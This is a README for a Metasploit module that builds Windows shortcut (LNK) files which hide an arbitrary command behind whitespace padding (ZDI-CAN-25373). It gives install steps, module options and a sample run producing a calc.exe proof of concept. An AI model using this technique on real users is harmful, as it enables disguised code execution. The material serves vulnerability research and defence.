# Windows LNK Padding - Metasploit Module

Full analysis can be found here, https://zeifan.my/Windows-LNK/. The write up consists of how to craft LNK :)

## Installation

1. Copy the `datablock_padding_lnk.rb` file to your Metasploit modules directory:
   ```
   cp datablock_padding_lnk.rb /usr/share/metasploit-framework/modules/auxiliary/fileformat
   ```

## Usage

#### Show Info
```
msf6 > use auxiliary/fileformat/datablock_padding_lnk
msf6 auxiliary(fileformat/datablock_padding_lnk) > show info

       Name: ZDI-CAN-25373 - Windows Shortcut (LNK) Padding
     Module: auxiliary/fileformat/datablock_padding_lnk
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2025-07-19

Provided by:
  Nafiez

Check supported:
  No

Basic options:
  Name         Current Setting                   Required  Description
  ----         ---------------                   --------  -----------
  BUFFER_SIZE  900                               yes       Buffer size before payload
  COMMAND      C:\Windows\System32\calc.exe      yes       Command to execute
  DESCRIPTION  testing purpose                   yes       LNK file description
  FILENAME     poc.lnk                           yes       The LNK filename to generate
  ICON_PATH    your_icon_path\WindowsBackup.ico  yes       Icon path for the LNK file

Description:
  This module generates Windows LNK (shortcut) file that can execute
  arbitrary commands. The LNK file uses environment variables and execute 
  its arguments from COMMAND_LINE_ARGUMENTS with extra juicy whitespace 
  character padding bytes and concatenates the actual payload.

References:
  https://zeifan.my/Windows-LNK/
  https://gist.github.com/nafiez/1236cc4c808a489e60e2927e0407c8d1
  https://www.trendmicro.com/en_us/research/25/c/windows-shortcut-zero-day-exploit.html


View the full module info with the info -d command.
```

#### Show Options
```
msf6 auxiliary(fileformat/datablock_padding_lnk) > show options

Module options (auxiliary/fileformat/datablock_padding_lnk):

   Name         Current Setting                   Required  Description
   ----         ---------------                   --------  -----------
   BUFFER_SIZE  900                               yes       Buffer size before payload
   COMMAND      C:\Windows\System32\calc.exe      yes       Command to execute
   DESCRIPTION  testing purpose                   yes       LNK file description
   FILENAME     poc.lnk                           yes       The LNK filename to generate
   ICON_PATH    your_icon_path\WindowsBackup.ico  yes       Icon path for the LNK file


View the full module info with the info, or info -d command
```

#### Generate LNK
```
msf6 auxiliary(fileformat/datablock_padding_lnk) > run

[*] Generating LNK file: poc.lnk
[+] poc.lnk stored at /root/.msf4/local/poc.lnk
[+] Successfully created poc.lnk
[*] Command line buffer size: 900 bytes
[*] Target command: C:\Windows\System32\calc.exe
[*] Auxiliary module execution completed
```
